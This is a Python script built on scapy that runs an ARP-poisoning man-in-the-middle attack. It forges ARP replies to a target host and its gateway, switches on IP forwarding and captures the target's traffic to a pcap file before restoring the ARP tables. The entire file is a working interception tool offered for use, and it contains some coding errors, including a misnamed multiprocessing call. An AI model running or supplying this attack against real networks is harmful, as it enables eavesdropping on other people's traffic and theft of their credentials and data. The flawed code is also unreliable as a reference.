import os, sys, multiprocessing
from scapy.all import *

interface = "VMnet8"
#targetIP = "192.168.43.54"
targetIP = "127.0.0.1"
gateIP = "192.168.43.1"
packets = 99999
logfile = "log.pcap"
bcast = "ff:ff:ff:ff:ff:ff"

def ip2mac(ip):
    rsp = srp1(Ether(dst=bcast) / ARP(pdst=ip), timeout=2, retry=3)
    return rsp[Ether].src

def arpPoison(gateIP, gateMac, targetIP, targetMac):
    while True:
        try:
            print("[+] ARP poisoning [CTRL-C to stop] ")
            send(ARP(op=2, psrc=gateIP, pdst=targetIP, hwdst=targetMac))
            send(ARP(op=2, psrc=targetIP, pdst=gateIP, hwdst=gateMac))
            time.sleep(2)
        except KeyboardInterrupt:
            pass

def arpRestore(gateIP, gateMac, targetIP, targetMac):
    for x in range(5):
        print("[+] Restoring ARP table [" + str(x) + " of 4]")
        send(ARP(op=2, psrc=gateIP, pdst=targetIP, hwdst=bcast, hwsrc=gateMac), count=5)
        send(ARP(op=2, psrc=targetIP, pdst=gateIP, hwdst=bcast, hwsrc=targetMac), count=5)
        time.sleep(2)

if __name__ == "__main__":
    conf.iface = interface
    conf.verb = 0
    gateMac = ip2mac(gateIP)
    targetMac = ip2mac(targetIP)

    print("[+] Interface: " + interface)
    print("[+] Gateway: " + gateIP + "[" + gateMac + "]")
    print("[+] target: " + targetIP + "[" + targetMac + "]")
    print("[+] Enabling Packet Forwarding")
    os.system("/sbin/sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")

    p = multiprocessing.process(target=arpPoison, args = (gateIP, gateMac, targetIP, targetMac,))   
    p.start()

    print("[+] Sniffing Packets")
    packets = sniff(count = packets, filter = ("ip host " + targetIP), iface = interface)
    wrpcap(logfile, packets)
    p.terminate()
    print("[+] Sniffing Complete")

    print("[+] Disable Packet Forwarding")
    os.system("/sbin/sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
    arpRestore(gateIP, gateMac, targetIP, targetMac)

    print("[+] Exiting")
